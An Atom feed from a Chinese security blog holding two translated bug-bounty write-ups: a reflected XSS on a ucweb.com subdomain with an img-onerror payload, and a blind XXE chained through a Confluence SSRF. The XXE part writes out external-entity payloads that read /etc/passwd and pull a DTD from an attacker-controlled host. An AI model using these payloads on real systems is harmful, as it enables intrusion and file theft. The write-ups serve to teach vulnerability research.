<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TimeS0ng&#39;s blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://TimeS0ng.github.io/"/>
  <updated>2018-12-21T08:30:41.793Z</updated>
  <id>http://TimeS0ng.github.io/</id>
  
  <author>
    <name>TimeS0ng</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>第四篇翻译：XSS漏洞</title>
    <link href="http://TimeS0ng.github.io/2018/12/21/%E7%AC%AC%E5%9B%9B%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E/"/>
    <id>http://TimeS0ng.github.io/2018/12/21/第四篇翻译：XSS漏洞/</id>
    <published>2018-12-21T08:30:09.000Z</published>
    <updated>2018-12-21T08:30:41.793Z</updated>
    
    <content type="html"><![CDATA[<h4 id="原文：Dom-Based-XSS-in-ucweb-com"><a href="#原文：Dom-Based-XSS-in-ucweb-com" class="headerlink" title="原文：Dom Based XSS in ucweb.com"></a>原文：<a href="https://medium.com/@sudhanshur705/story-about-my-first-bug-bounty-9fe710be8241" target="_blank" rel="external">Dom Based XSS in ucweb.com</a></h4><h4 id="漏洞：XSS"><a href="#漏洞：XSS" class="headerlink" title="漏洞：XSS"></a>漏洞：XSS</h4><h4 id="作者：Sudhanshu-Rajbhar"><a href="#作者：Sudhanshu-Rajbhar" class="headerlink" title="作者：Sudhanshu Rajbhar"></a>作者：Sudhanshu Rajbhar</h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
<h2 id="现在开始…"><a href="#现在开始…" class="headerlink" title="现在开始…."></a>现在开始….</h2><h4 id="emsp-emsp-首先，我检查了可用的子域名，但是最开始我并没有发现什么有趣的东西。直到当我开始测试ucweb-com的子域名时，我发现了这个子域-samsung-ucweb-com-，samsung-三星？似乎有点意思，所以我尝试用浏览器去访问它"><a href="#emsp-emsp-首先，我检查了可用的子域名，但是最开始我并没有发现什么有趣的东西。直到当我开始测试ucweb-com的子域名时，我发现了这个子域-samsung-ucweb-com-，samsung-三星？似乎有点意思，所以我尝试用浏览器去访问它" class="headerlink" title="&emsp;&emsp;首先，我检查了可用的子域名，但是最开始我并没有发现什么有趣的东西。直到当我开始测试ucweb.com的子域名时，我发现了这个子域 samsung.ucweb.com ，samsung 三星？似乎有点意思，所以我尝试用浏览器去访问它"></a>&emsp;&emsp;首先，我检查了可用的子域名，但是最开始我并没有发现什么有趣的东西。直到当我开始测试ucweb.com的子域名时，我发现了这个子域 samsung.ucweb.com ，samsung 三星？似乎有点意思，所以我尝试用浏览器去访问它</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_4/1.png" alt=""></p>
<h4 id="emsp-emsp-很不幸，这是一个403-禁用的网站，如果是你碰见了下一步会怎么做？很显然，大多数人都会忽略它，然后测试其它子域。不过我曾读过一篇文章，它说如果你遇到这样的网站，尝试用Google-搜索一下相关站点信息，或许会有惊喜发现"><a href="#emsp-emsp-很不幸，这是一个403-禁用的网站，如果是你碰见了下一步会怎么做？很显然，大多数人都会忽略它，然后测试其它子域。不过我曾读过一篇文章，它说如果你遇到这样的网站，尝试用Google-搜索一下相关站点信息，或许会有惊喜发现" class="headerlink" title="&emsp;&emsp;很不幸，这是一个403 禁用的网站，如果是你碰见了下一步会怎么做？很显然，大多数人都会忽略它，然后测试其它子域。不过我曾读过一篇文章，它说如果你遇到这样的网站，尝试用Google 搜索一下相关站点信息，或许会有惊喜发现"></a>&emsp;&emsp;很不幸，这是一个403 禁用的网站，如果是你碰见了下一步会怎么做？很显然，大多数人都会忽略它，然后测试其它子域。不过我曾读过一篇文章，它说如果你遇到这样的网站，尝试用Google 搜索一下相关站点信息，或许会有惊喜发现</h4><h4 id="emsp-emsp-所以我是用谷歌语法简单的看了一下，site-samsung-ucweb-com-结果真的有惊喜"><a href="#emsp-emsp-所以我是用谷歌语法简单的看了一下，site-samsung-ucweb-com-结果真的有惊喜" class="headerlink" title="&emsp;&emsp;所以我是用谷歌语法简单的看了一下，site:samsung.ucweb.com  结果真的有惊喜"></a>&emsp;&emsp;所以我是用谷歌语法简单的看了一下，<strong>site:samsung.ucweb.com </strong> 结果真的有惊喜</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_4/2.png" alt=""></p>
<h4 id="emsp-emsp-我打开了这个URL：http-samsung-ucweb-com-webstore-classify-html-dataKey-LifeStyle-amp-title-LifeStyle-并开始测试相关参数，当我测试title参数时，发现服务端并没有过滤title参数的值就将其打印出来了"><a href="#emsp-emsp-我打开了这个URL：http-samsung-ucweb-com-webstore-classify-html-dataKey-LifeStyle-amp-title-LifeStyle-并开始测试相关参数，当我测试title参数时，发现服务端并没有过滤title参数的值就将其打印出来了" class="headerlink" title="&emsp;&emsp;我打开了这个URL：http://samsung.ucweb.com/webstore/classify.html?dataKey=LifeStyle&amp;title=LifeStyle 并开始测试相关参数，当我测试title参数时，发现服务端并没有过滤title参数的值就将其打印出来了"></a>&emsp;&emsp;我打开了这个URL：<a href="http://samsung.ucweb.com/webstore/classify.html?dataKey=LifeStyle&amp;title=LifeStyle" target="_blank" rel="external">http://samsung.ucweb.com/webstore/classify.html?dataKey=LifeStyle&amp;title=LifeStyle</a> 并开始测试相关参数，当我测试title参数时，发现服务端并没有过滤title参数的值就将其打印出来了</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_4/3.png" alt=""></p>
<h4 id="emsp-emsp-所以我尝试构造payload来利用这个漏洞点，当我使用”-gt-lt-script-gt-alert-1-lt-script-gt-时并没有任何弹窗，所以我尝试用-lt-img-gt-标签"><a href="#emsp-emsp-所以我尝试构造payload来利用这个漏洞点，当我使用”-gt-lt-script-gt-alert-1-lt-script-gt-时并没有任何弹窗，所以我尝试用-lt-img-gt-标签" class="headerlink" title="&emsp;&emsp;所以我尝试构造payload来利用这个漏洞点，当我使用”&gt; &lt; script&gt;alert(1)&lt;/ script&gt;时并没有任何弹窗，所以我尝试用 &lt; img&gt;标签"></a>&emsp;&emsp;所以我尝试构造payload来利用这个漏洞点，当我使用”&gt; &lt; script&gt;alert(1)&lt;/ script&gt;时并没有任何弹窗，所以我尝试用 &lt; img&gt;标签</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;&gt;&lt;img src=x onerror=alert(‘XSS’)&gt;</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_4/4.png" alt=""></p>
<h2 id="视屏演示"><a href="#视屏演示" class="headerlink" title="视屏演示"></a>视屏演示</h2><video id="video" controls preload="none" poster="http://img5.imgtn.bdimg.com/it/u=750248180,3726006403&fm=26&gp=0.jpg"><br><source id="mp4" src="http://img.027cgb.com/612577/times0ng_blog/tanslate_4/XSS_in_alibaba.mp4" type="video/mp4"><br></video>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;原文：Dom-Based-XSS-in-ucweb-com&quot;&gt;&lt;a href=&quot;#原文：Dom-Based-XSS-in-ucweb-com&quot; class=&quot;headerlink&quot; title=&quot;原文：Dom Based XSS in ucweb.com&quot;&gt;&lt;/a&gt;原文：&lt;a href=&quot;https://medium.com/@sudhanshur705/story-about-my-first-bug-bounty-9fe710be8241&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Dom Based XSS in ucweb.com&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;漏洞：XSS&quot;&gt;&lt;a href=&quot;#漏洞：XSS&quot; class=&quot;headerlink&quot; title=&quot;漏洞：XSS&quot;&gt;&lt;/a&gt;漏洞：XSS&lt;/h4&gt;&lt;h4 id=&quot;作者：Sudhanshu-Rajbhar&quot;&gt;&lt;a href=&quot;#作者：Sudhanshu-Rajbhar&quot; class=&quot;headerlink&quot; title=&quot;作者：Sudhanshu Rajbhar&quot;&gt;&lt;/a&gt;作者：Sudhanshu Rajbhar&lt;/h4&gt;&lt;h4 id=&quot;难度：低&quot;&gt;&lt;a href=&quot;#难度：低&quot; class=&quot;headerlink&quot; title=&quot;难度：低&quot;&gt;&lt;/a&gt;难度：低&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>第三篇翻译：XXE漏洞</title>
    <link href="http://TimeS0ng.github.io/2018/12/20/%E7%AC%AC%E4%B8%89%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9AXXE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://TimeS0ng.github.io/2018/12/20/第三篇翻译：XXE漏洞/</id>
    <published>2018-12-20T12:54:30.000Z</published>
    <updated>2018-12-20T12:56:55.942Z</updated>
    
    <content type="html"><![CDATA[<h4 id="原文：From-blind-XXE-to-root-level-file-read-access"><a href="#原文：From-blind-XXE-to-root-level-file-read-access" class="headerlink" title="原文：From blind XXE to root-level file read access"></a>原文：<a href="https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/" target="_blank" rel="external">From blind XXE to root-level file read access</a></h4><h4 id="漏洞：Blind-XXE"><a href="#漏洞：Blind-XXE" class="headerlink" title="漏洞：Blind XXE"></a>漏洞：Blind XXE</h4><h4 id="作者：Pieter"><a href="#作者：Pieter" class="headerlink" title="作者：Pieter"></a>作者：Pieter</h4><h4 id="难度：高"><a href="#难度：高" class="headerlink" title="难度：高"></a>难度：高</h4><a id="more"></a>
<h4 id="emsp-emsp-接下来，我将概述我挖洞时遇到的问题，以及遇到问题时我是怎么处理并解决的，希望这能够帮助大家在今后遇到类似的问题时知道该如何处理！"><a href="#emsp-emsp-接下来，我将概述我挖洞时遇到的问题，以及遇到问题时我是怎么处理并解决的，希望这能够帮助大家在今后遇到类似的问题时知道该如何处理！" class="headerlink" title="&emsp;&emsp;接下来，我将概述我挖洞时遇到的问题，以及遇到问题时我是怎么处理并解决的，希望这能够帮助大家在今后遇到类似的问题时知道该如何处理！"></a>&emsp;&emsp;接下来，我将概述我挖洞时遇到的问题，以及遇到问题时我是怎么处理并解决的，希望这能够帮助大家在今后遇到类似的问题时知道该如何处理！</h4><h2 id="我关注的重点？"><a href="#我关注的重点？" class="headerlink" title="我关注的重点？"></a>我关注的重点？</h2><h4 id="emsp-emsp-一个简单的XML格式的错误响应信息，以及一个被探测到的404地址引起了我的注意。"><a href="#emsp-emsp-一个简单的XML格式的错误响应信息，以及一个被探测到的404地址引起了我的注意。" class="headerlink" title="&emsp;&emsp;一个简单的XML格式的错误响应信息，以及一个被探测到的404地址引起了我的注意。"></a>&emsp;&emsp;一个简单的XML格式的错误响应信息，以及一个被探测到的404地址引起了我的注意。</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/tanslate_3/1.png" alt=""></p>
<h4 id="emsp-emsp-当我将请求方法改为POST，并且增加一个请求头-Content-Type-application-xml，再添加了一个XML主体之后，响应消息让我大吃一惊！"><a href="#emsp-emsp-当我将请求方法改为POST，并且增加一个请求头-Content-Type-application-xml，再添加了一个XML主体之后，响应消息让我大吃一惊！" class="headerlink" title="&emsp;&emsp;当我将请求方法改为POST，并且增加一个请求头 Content-Type: application/xml，再添加了一个XML主体之后，响应消息让我大吃一惊！"></a>&emsp;&emsp;当我将请求方法改为POST，并且增加一个请求头 Content-Type: application/xml，再添加了一个XML主体之后，响应消息让我大吃一惊！</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/tanslate_3/2.png" alt=""></p>
<h4 id="emsp-emsp-继续完善XML主体，当发送完整的XML文档时会产生下面的结果。我们注意到服务器需要认证之后才能进行交互，但是我们完全不知道该认证什么以及在哪里进行认证，所以这里XXE漏洞很难利用"><a href="#emsp-emsp-继续完善XML主体，当发送完整的XML文档时会产生下面的结果。我们注意到服务器需要认证之后才能进行交互，但是我们完全不知道该认证什么以及在哪里进行认证，所以这里XXE漏洞很难利用" class="headerlink" title="&emsp;&emsp;继续完善XML主体，当发送完整的XML文档时会产生下面的结果。我们注意到服务器需要认证之后才能进行交互，但是我们完全不知道该认证什么以及在哪里进行认证，所以这里XXE漏洞很难利用"></a>&emsp;&emsp;继续完善XML主体，当发送完整的XML文档时会产生下面的结果。我们注意到服务器需要认证之后才能进行交互，但是我们完全不知道该认证什么以及在哪里进行认证，所以这里XXE漏洞很难利用</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/tanslate_3/3.png" alt=""></p>
<h4 id="emsp-emsp-尽管现在发现的漏洞如此鸡肋，但是无论怎样我们都应该尝试一下包含DOCTYPE-定义的外部实体是否可用，如果外部实体没有被完全禁用，那么就还有戏"><a href="#emsp-emsp-尽管现在发现的漏洞如此鸡肋，但是无论怎样我们都应该尝试一下包含DOCTYPE-定义的外部实体是否可用，如果外部实体没有被完全禁用，那么就还有戏" class="headerlink" title="&emsp;&emsp;尽管现在发现的漏洞如此鸡肋，但是无论怎样我们都应该尝试一下包含DOCTYPE 定义的外部实体是否可用，如果外部实体没有被完全禁用，那么就还有戏"></a>&emsp;&emsp;尽管现在发现的漏洞如此鸡肋，但是无论怎样我们都应该尝试一下包含DOCTYPE 定义的外部实体是否可用，如果外部实体没有被完全禁用，那么就还有戏</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/tanslate_3/4.png" alt=""></p>
<h4 id="emsp-emsp-我紧张的看着我的Burp-Collaborator-的结果，非常期待收到来自服务器传递过来的HTTP请求，但是很不幸，并没有得到预期的结果。可以看见服务器解析了我的域名，但是却没有HTTP请求，并且服务器在几秒钟之后就因500错误Timeout了。这似乎是因为防火墙阻止了服务器的出口流量，只有UDP-53端口开放"><a href="#emsp-emsp-我紧张的看着我的Burp-Collaborator-的结果，非常期待收到来自服务器传递过来的HTTP请求，但是很不幸，并没有得到预期的结果。可以看见服务器解析了我的域名，但是却没有HTTP请求，并且服务器在几秒钟之后就因500错误Timeout了。这似乎是因为防火墙阻止了服务器的出口流量，只有UDP-53端口开放" class="headerlink" title="&emsp;&emsp;我紧张的看着我的Burp Collaborator 的结果，非常期待收到来自服务器传递过来的HTTP请求，但是很不幸，并没有得到预期的结果。可以看见服务器解析了我的域名，但是却没有HTTP请求，并且服务器在几秒钟之后就因500错误Timeout了。这似乎是因为防火墙阻止了服务器的出口流量，只有UDP 53端口开放"></a>&emsp;&emsp;我紧张的看着我的Burp Collaborator 的结果，非常期待收到来自服务器传递过来的HTTP请求，但是很不幸，并没有得到预期的结果。可以看见服务器解析了我的域名，但是却没有HTTP请求，并且服务器在几秒钟之后就因500错误Timeout了。这似乎是因为防火墙阻止了服务器的出口流量，只有UDP 53端口开放</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/tanslate_3/5.png" alt=""></p>
<h2 id="盲注…"><a href="#盲注…" class="headerlink" title="盲注…"></a>盲注…</h2><h4 id="emsp-emsp-当我尝试访问本地文件和内部网络服务的时候，我得到了一些反馈结果，不过这并没有太大的价值！下面的Response-error表示访问的文件存在，并且可以由XML解析器打开和读取，但是该文件的内容不是有效的DTD文档类型，所以解析失败并且报错"><a href="#emsp-emsp-当我尝试访问本地文件和内部网络服务的时候，我得到了一些反馈结果，不过这并没有太大的价值！下面的Response-error表示访问的文件存在，并且可以由XML解析器打开和读取，但是该文件的内容不是有效的DTD文档类型，所以解析失败并且报错" class="headerlink" title="&emsp;&emsp;当我尝试访问本地文件和内部网络服务的时候，我得到了一些反馈结果，不过这并没有太大的价值！下面的Response error表示访问的文件存在，并且可以由XML解析器打开和读取，但是该文件的内容不是有效的DTD文档类型，所以解析失败并且报错"></a>&emsp;&emsp;当我尝试访问本地文件和内部网络服务的时候，我得到了一些反馈结果，不过这并没有太大的价值！下面的Response error表示访问的文件存在，并且可以由XML解析器打开和读取，但是该文件的内容不是有效的DTD文档类型，所以解析失败并且报错</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/tanslate_3/6.png" alt=""></p>
<h4 id="emsp-emsp-当访问不存在的文件时，Response-error-响应信息不同，它会提示文件不存在"><a href="#emsp-emsp-当访问不存在的文件时，Response-error-响应信息不同，它会提示文件不存在" class="headerlink" title="&emsp;&emsp;当访问不存在的文件时，Response error 响应信息不同，它会提示文件不存在"></a>&emsp;&emsp;当访问不存在的文件时，Response error 响应信息不同，它会提示文件不存在</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/tanslate_3/7.png" alt=""></p>
<h4 id="emsp-emsp-接下来我们尝试利用这个blind-XXE-漏洞做为一个原始的端口扫描器，扫描内网端口。这种类型的bind-XXE-类似于SSRF漏洞：你可以生成HTTP请求，但是不能读取响应信息"><a href="#emsp-emsp-接下来我们尝试利用这个blind-XXE-漏洞做为一个原始的端口扫描器，扫描内网端口。这种类型的bind-XXE-类似于SSRF漏洞：你可以生成HTTP请求，但是不能读取响应信息" class="headerlink" title="&emsp;&emsp;接下来我们尝试利用这个blind XXE 漏洞做为一个原始的端口扫描器，扫描内网端口。这种类型的bind XXE 类似于SSRF漏洞：你可以生成HTTP请求，但是不能读取响应信息"></a>&emsp;&emsp;接下来我们尝试利用这个blind XXE 漏洞做为一个原始的端口扫描器，扫描内网端口。这种类型的bind XXE 类似于SSRF漏洞：你可以生成HTTP请求，但是不能读取响应信息</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/tanslate_3/8.png" alt=""></p>
<h4 id="emsp-emsp-既然可以扫描端口，我们同样也能检查服务器支持的协议类型，例如：https，gopher，ftp，jar，scp等等。看下图，错误消息中会将用户提供的协议打印出来，这个有点意思，我们暂时记住它以后再说！"><a href="#emsp-emsp-既然可以扫描端口，我们同样也能检查服务器支持的协议类型，例如：https，gopher，ftp，jar，scp等等。看下图，错误消息中会将用户提供的协议打印出来，这个有点意思，我们暂时记住它以后再说！" class="headerlink" title="&emsp;&emsp;既然可以扫描端口，我们同样也能检查服务器支持的协议类型，例如：https，gopher，ftp，jar，scp等等。看下图，错误消息中会将用户提供的协议打印出来，这个有点意思，我们暂时记住它以后再说！"></a>&emsp;&emsp;既然可以扫描端口，我们同样也能检查服务器支持的协议类型，例如：https，gopher，ftp，jar，scp等等。看下图，错误消息中会将用户提供的协议打印出来，这个有点意思，我们暂时记住它以后再说！</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/tanslate_3/9.png" alt=""></p>
<h4 id="emsp-emsp-现在我们尝试利用Bind-XXE访问内部WEB网站，前面测试中我们发现出口流量会被防火墙阻拦，但是内部访问是否同样会被禁止呢？有趣，Response-error中的错误信息我们之前也遇到过，那代表着资源已经被读取，但不是XML格式所以出错，这意味着内部网络是可以访问的，防火墙并没有拦截！"><a href="#emsp-emsp-现在我们尝试利用Bind-XXE访问内部WEB网站，前面测试中我们发现出口流量会被防火墙阻拦，但是内部访问是否同样会被禁止呢？有趣，Response-error中的错误信息我们之前也遇到过，那代表着资源已经被读取，但不是XML格式所以出错，这意味着内部网络是可以访问的，防火墙并没有拦截！" class="headerlink" title="&emsp;&emsp;现在我们尝试利用Bind XXE访问内部WEB网站，前面测试中我们发现出口流量会被防火墙阻拦，但是内部访问是否同样会被禁止呢？有趣，Response error中的错误信息我们之前也遇到过，那代表着资源已经被读取，但不是XML格式所以出错，这意味着内部网络是可以访问的，防火墙并没有拦截！"></a>&emsp;&emsp;现在我们尝试利用Bind XXE访问内部WEB网站，前面测试中我们发现出口流量会被防火墙阻拦，但是内部访问是否同样会被禁止呢？有趣，Response error中的错误信息我们之前也遇到过，那代表着资源已经被读取，但不是XML格式所以出错，这意味着内部网络是可以访问的，防火墙并没有拦截！</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">wiki.company.internal</div><div class="line">jira.company.internal</div><div class="line">confluence.company.internal</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/10.png" alt=""></p>
<h2 id="柳暗花明？！"><a href="#柳暗花明？！" class="headerlink" title="柳暗花明？！"></a>柳暗花明？！</h2><h4 id="emsp-emsp-当我们访问jira-company-internal-这个站点成功之后，我觉得我现在可以祭出大杀器了–—利用jira的URL重定向漏洞，将它设置为我们的代理主机，并尝试利用代理主机将流量转发出来，如果你不知道这个漏洞，我建议你看看freebuf上的这篇文章-https-www-freebuf-com-vuls-168719-html"><a href="#emsp-emsp-当我们访问jira-company-internal-这个站点成功之后，我觉得我现在可以祭出大杀器了–—利用jira的URL重定向漏洞，将它设置为我们的代理主机，并尝试利用代理主机将流量转发出来，如果你不知道这个漏洞，我建议你看看freebuf上的这篇文章-https-www-freebuf-com-vuls-168719-html" class="headerlink" title="&emsp;&emsp;当我们访问jira.company.internal 这个站点成功之后，我觉得我现在可以祭出大杀器了–—利用jira的URL重定向漏洞，将它设置为我们的代理主机，并尝试利用代理主机将流量转发出来，如果你不知道这个漏洞，我建议你看看freebuf上的这篇文章 https://www.freebuf.com/vuls/168719.html"></a>&emsp;&emsp;当我们访问jira.company.internal 这个站点成功之后，我觉得我现在可以祭出大杀器了–—利用jira的URL重定向漏洞，将它设置为我们的代理主机，并尝试利用代理主机将流量转发出来，如果你不知道这个漏洞，我建议你看看freebuf上的这篇文章 <a href="https://www.freebuf.com/vuls/168719.html" target="_blank" rel="external">https://www.freebuf.com/vuls/168719.html</a></h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/11.png" alt=""></p>
<h4 id="emsp-emsp-代理失败了，原因是在SSL认证中出现任何错误的话，HTTPS流量都将失效！幸运的是，Jira默认也运行在TCP-8080端口上，所以咱们用HTTP协议再来代理看看。当我检查Burp-Collaborator时，并没有任何HTTP访问请求，继续宣告代理失败…"><a href="#emsp-emsp-代理失败了，原因是在SSL认证中出现任何错误的话，HTTPS流量都将失效！幸运的是，Jira默认也运行在TCP-8080端口上，所以咱们用HTTP协议再来代理看看。当我检查Burp-Collaborator时，并没有任何HTTP访问请求，继续宣告代理失败…" class="headerlink" title="&emsp;&emsp;代理失败了，原因是在SSL认证中出现任何错误的话，HTTPS流量都将失效！幸运的是，Jira默认也运行在TCP 8080端口上，所以咱们用HTTP协议再来代理看看。当我检查Burp Collaborator时，并没有任何HTTP访问请求，继续宣告代理失败…."></a>&emsp;&emsp;代理失败了，原因是在SSL认证中出现任何错误的话，HTTPS流量都将失效！幸运的是，Jira默认也运行在TCP 8080端口上，所以咱们用HTTP协议再来代理看看。当我检查Burp Collaborator时，并没有任何HTTP访问请求，继续宣告代理失败….</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/12.png" alt=""></p>
<h4 id="emsp-emsp-出现上面的情况很有可能是管理员已经修复了Jira中的漏洞。最后我已经接近疯狂了，TMD利用个漏洞这么麻烦，我尝试了可能存在的SSRF漏洞，当我在内部网站http-Confluence-company-internal-上尝试用与Jira相同的漏洞时奇迹发生了，代理生效了，终于有HTTP请求啦"><a href="#emsp-emsp-出现上面的情况很有可能是管理员已经修复了Jira中的漏洞。最后我已经接近疯狂了，TMD利用个漏洞这么麻烦，我尝试了可能存在的SSRF漏洞，当我在内部网站http-Confluence-company-internal-上尝试用与Jira相同的漏洞时奇迹发生了，代理生效了，终于有HTTP请求啦" class="headerlink" title="&emsp;&emsp;出现上面的情况很有可能是管理员已经修复了Jira中的漏洞。最后我已经接近疯狂了，TMD利用个漏洞这么麻烦，我尝试了可能存在的SSRF漏洞，当我在内部网站http://Confluence.company.internal 上尝试用与Jira相同的漏洞时奇迹发生了，代理生效了，终于有HTTP请求啦"></a>&emsp;&emsp;出现上面的情况很有可能是管理员已经修复了Jira中的漏洞。最后我已经接近疯狂了，TMD利用个漏洞这么麻烦，我尝试了可能存在的SSRF漏洞，当我在内部网站<a href="http://Confluence.company.internal" target="_blank" rel="external">http://Confluence.company.internal</a> 上尝试用与Jira相同的漏洞时奇迹发生了，代理生效了，终于有HTTP请求啦</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/13.png" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/14.png" alt=""></p>
<h4 id="emsp-emsp-Bingo！我们成功利用内部WEB站点作代理绕过防火墙，将流量转发到攻击者的电脑上。这意味着从现在开始我们就能利用经典的blind-XXE进行攻击啦-此处应该有掌声👏-，如果不清楚bind-XXE的利用方法的话可以参考freebuf上的文章-https-www-freebuf-com-column-181064-html"><a href="#emsp-emsp-Bingo！我们成功利用内部WEB站点作代理绕过防火墙，将流量转发到攻击者的电脑上。这意味着从现在开始我们就能利用经典的blind-XXE进行攻击啦-此处应该有掌声👏-，如果不清楚bind-XXE的利用方法的话可以参考freebuf上的文章-https-www-freebuf-com-column-181064-html" class="headerlink" title="&emsp;&emsp;Bingo！我们成功利用内部WEB站点作代理绕过防火墙，将流量转发到攻击者的电脑上。这意味着从现在开始我们就能利用经典的blind XXE进行攻击啦(此处应该有掌声👏)，如果不清楚bind XXE的利用方法的话可以参考freebuf上的文章 https://www.freebuf.com/column/181064.html"></a>&emsp;&emsp;Bingo！我们成功利用内部WEB站点作代理绕过防火墙，将流量转发到攻击者的电脑上。这意味着从现在开始我们就能利用经典的blind XXE进行攻击啦(此处应该有掌声👏)，如果不清楚bind XXE的利用方法的话可以参考freebuf上的文章 <a href="https://www.freebuf.com/column/181064.html" target="_blank" rel="external">https://www.freebuf.com/column/181064.html</a></h4><p>[*]攻击者服务器上的evil.xml</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % file SYSTEM &quot;file:///&quot;&gt;</div><div class="line">&lt;!ENTITY % ent &quot;&lt;!ENTITY data SYSTEM &apos;%file;&apos;&gt;&quot;&gt;</div></pre></td></tr></table></figure>
<p>[*]burp发送的xml注入语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</div><div class="line">&lt;!DOCTYPE root [</div><div class="line">&lt;!ENTITY % ext SYSTEM &quot;http://confluence.company.internal:8090/plugins/servlet/oauth/users/icon-uri?consumerUri=http://my_evil_site/evil.xml&quot;&gt;</div><div class="line">%ext;</div><div class="line">%ent;</div><div class="line">]&gt;</div><div class="line">&lt;r&gt;&amp;data;&lt;/r&gt;</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/15.png" alt=""></p>
<h4 id="emsp-emsp-大家注意观察上面我标记的-no-protocal，因为读取到的目录内容是-bin-boot-dev-etc-home…-没有像之前的-gopher-localhost-一样指定任何协议类型，所以显示no-protocal，然后将读取到的内容打印出来"><a href="#emsp-emsp-大家注意观察上面我标记的-no-protocal，因为读取到的目录内容是-bin-boot-dev-etc-home…-没有像之前的-gopher-localhost-一样指定任何协议类型，所以显示no-protocal，然后将读取到的内容打印出来" class="headerlink" title="&emsp;&emsp;大家注意观察上面我标记的 no protocal，因为读取到的目录内容是 bin boot dev etc home….没有像之前的 gopher://localhost 一样指定任何协议类型，所以显示no protocal，然后将读取到的内容打印出来"></a>&emsp;&emsp;大家注意观察上面我标记的 no protocal，因为读取到的目录内容是 bin boot dev etc home….没有像之前的 gopher://localhost 一样指定任何协议类型，所以显示no protocal，然后将读取到的内容打印出来</h4><h4 id="emsp-emsp-但是当我去读取-etc-passwd时，读取到的内容是："><a href="#emsp-emsp-但是当我去读取-etc-passwd时，读取到的内容是：" class="headerlink" title="&emsp;&emsp;但是当我去读取/etc/passwd时，读取到的内容是："></a>&emsp;&emsp;但是当我去读取/etc/passwd时，读取到的内容是：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root:x:0:0:root:/root:/bin/bash</div><div class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</div><div class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</div><div class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</div><div class="line">[…]</div></pre></td></tr></table></figure>
<h4 id="emsp-emsp-因为文件内容是以-root-x-开头，所以服务器就会误以为我指定的协议类型是root，于是服务器只是将我指定的协议打印出来了，就像先前打印gopher一样，这就导致我们不能正确读取文件内容"><a href="#emsp-emsp-因为文件内容是以-root-x-开头，所以服务器就会误以为我指定的协议类型是root，于是服务器只是将我指定的协议打印出来了，就像先前打印gopher一样，这就导致我们不能正确读取文件内容" class="headerlink" title="&emsp;&emsp;因为文件内容是以 root:x 开头，所以服务器就会误以为我指定的协议类型是root，于是服务器只是将我指定的协议打印出来了，就像先前打印gopher一样，这就导致我们不能正确读取文件内容"></a>&emsp;&emsp;因为文件内容是以 root:x 开头，所以服务器就会误以为我指定的协议类型是root，于是服务器只是将我指定的协议打印出来了，就像先前打印gopher一样，这就导致我们不能正确读取文件内容</h4><p>[*]攻击者服务器上的evil.xml</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</div><div class="line">&lt;!ENTITY % ent &quot;&lt;!ENTITY data SYSTEM &apos;%file;&apos;&gt;&quot;&gt;</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/16.png" alt=""></p>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/tanslate_3/9.png" alt=""></p>
